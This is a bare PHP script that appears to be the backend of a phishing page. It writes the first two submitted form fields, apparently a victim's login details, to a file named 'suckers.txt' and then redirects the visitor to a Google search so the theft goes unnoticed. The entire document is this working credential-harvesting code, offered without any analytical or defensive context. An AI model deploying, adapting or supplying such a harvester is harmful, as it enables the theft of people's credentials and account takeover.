<?php
$filename = "suckers.txt";
$localArr = [];

foreach ($_POST as $val)
    $localArr[] = $val;

for ($i = 0; 2 > $i; $i++)
    file_put_contents($filename, $localArr[$i] . ';', FILE_APPEND | LOCK_EX);



$url = str_replace(" ", "+", $localArr[2]);
header("Location: https://www.google.com/search?q=$url");
